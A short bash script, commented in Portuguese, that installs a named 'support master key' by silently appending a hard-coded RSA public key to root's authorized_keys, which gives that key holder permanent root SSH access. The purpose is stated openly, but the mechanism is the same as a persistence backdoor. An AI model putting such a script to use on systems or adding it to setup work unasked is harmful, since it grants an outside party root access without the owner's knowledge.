#!/bin/bash

# Instalar master-key de suporte
#==========================================================

    # Arquivo de chaves confiaveis
    AKFILE="/root/.ssh/authorized_keys";

    # Patrick
    pb_key_name="patrickbrandao@localhost";
    pb_key_type="ssh-rsa";
    pb_key_content="AAAAB3NzaC1yc2EAAAADAQABAAABAQCn5mH5RDQp3XUDCilcCJOmu41NQa9MddyOdUTbA8OPGexPFGVOSKMoY3Rg7f6jRmnVUNM5NPwRlQ+dgospiPT9zGzYf6MMB5lWiCgakshmUaub8X+tQrpOJhj17OjDZdwKhWhl38MUeXl8yD3MY/DM0WS66OMz3mB0W33PNm1q9pCNBQHNpErD9Au3aOOhDHekVqeUwKXg555VJJUZ/y+9f3oUZYJ8wHsoZYgbscQh89J4ouUkC4mXFLAk/KVO12hLSKnpTj8pIt76Slc6Ic/zvm6RFegcUNOeIoh/cm1j/l6RIL/s6b9i+WsLZPtwTFTZjI/2KnXXBZlqnt1QLXqt";

    # Injetar chave de confianca
    inject_key(){
        key_name="$1";
        key_type="$2";
        key_content="$3";
        egrep "$key_name" "$AKFILE" || {
            (
                echo;
                echo "$key_type $key_content $key_name";
                echo;
            ) >> "$AKFILE";
        };
    };

    # Criar diretorio de chaves
    mkdir -p /root/.ssh;
    touch "$AKFILE";
    inject_key "$pb_key_name" "$pb_key_type" "$pb_key_content";


exit 0;

